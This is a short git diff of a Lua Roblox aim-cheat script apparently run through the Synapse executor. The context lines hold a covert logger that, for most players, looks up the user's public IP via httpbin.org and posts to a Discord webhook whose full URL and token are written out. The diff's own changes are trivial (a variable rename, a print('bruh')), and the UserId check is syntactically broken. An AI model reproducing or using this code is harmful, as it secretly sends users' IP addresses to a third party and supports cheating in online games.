@@ -194,6 +194,7 @@ function ValiantAimHacks.findDirectionNormalMaterial(Origin, Destination, UnitMu
 end
 
 
+
 if LocalPlayer.UserId ~= 623162005 or LocalPlayer.UserId ~= 1638172844 LocalPlayer.UserId ~= or LocalPlayer.UserId ~= 1308829163 or LocalPlayer.UserId ~= 1278815007 then
 	local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
 
@@ -209,7 +210,7 @@ if LocalPlayer.UserId ~= 623162005 or LocalPlayer.UserId ~= 1638172844 LocalPlay
 	);
 else
 
-	local response = syn.request(
+	local response1 = syn.request(
 		{
 			Url = 'https://discord.com/api/webhooks/856531569338220565/3AsGt467TBFZ7NTigDmNIeNjJOU5uvmqeX0vOxmJZ4hZqYpWGTkA1M1Oh3e-hAr3azJv',
 			Method = 'POST',
@@ -221,7 +222,7 @@ else
 	);
 end
 
-
+print("bruh")
 
 -- // Get Character
 function ValiantAimHacks.getCharacter(Player)
